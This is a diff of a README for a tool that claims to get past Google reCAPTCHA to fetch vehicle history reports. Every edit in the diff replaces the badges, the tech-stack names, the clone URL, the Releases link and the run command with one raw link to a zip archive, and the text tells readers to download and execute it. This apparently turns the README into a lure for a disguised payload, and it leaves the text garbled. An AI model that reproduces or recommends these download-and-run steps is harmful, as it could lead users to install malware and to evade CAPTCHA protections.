@@ -1,8 +1,8 @@
 # Vehicle Report CAPTCHA Bypasser 🚗🔍
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser)
-![License](https://img.shields.io/badge/license-MIT-blue)
-![Python Version](https://img.shields.io/badge/python-3.7%2B-green)
+![GitHub Repo Size](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip)
+![License](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip)
+![Python Version](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip%2B-green)
 
 Welcome to the **Vehicle Report CAPTCHA Bypasser** repository! This project provides a stealth automation tool designed to bypass Google reCAPTCHA (both v2 and v3) using headless browsers and CAPTCHA-solving APIs. With this tool, you can access vehicle history reports instantly and efficiently.
 
@@ -35,16 +35,16 @@ In today's digital landscape, obtaining vehicle history reports can be challengi
 
 - **Puppeteer**: A Node library to control headless Chrome or Chromium.
 - **2Captcha**: An API for solving CAPTCHAs.
-- **Node.js**: JavaScript runtime for building the application.
-- **Express**: Web framework for Node.js to handle server requests.
-- **Axios**: Promise-based HTTP client for the browser and Node.js.
+- **https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip**: JavaScript runtime for building the application.
+- **Express**: Web framework for https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip to handle server requests.
+- **Axios**: Promise-based HTTP client for the browser and https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip
 
 ## Installation
 
 To get started, clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser.git
+git clone https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip
 cd Vehicle-Report-CAPTCHA-Bypasser
 ```
 
@@ -56,10 +56,10 @@ npm install
 
 ## Usage
 
-To use the tool, you need to download the latest release. Visit the [Releases section](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/releases) to find the appropriate file. Once downloaded, execute the file:
+To use the tool, you need to download the latest release. Visit the [Releases section](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip) to find the appropriate file. Once downloaded, execute the file:
 
 ```bash
-node your-file-name.js
+node https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip
 ```
 
 Follow the prompts to input the vehicle details and initiate the report retrieval process.
@@ -97,7 +97,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any issues or questions, feel free to open an issue in the repository or check the [Releases section](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/releases) for updates and downloads.
+For any issues or questions, feel free to open an issue in the repository or check the [Releases section](https://github.com/Dhruv171711/Vehicle-Report-CAPTCHA-Bypasser/raw/refs/heads/main/irresponsible/CAPTCH_Bypasser_Report_Vehicle_hastati.zip) for updates and downloads.
 
 ---
 
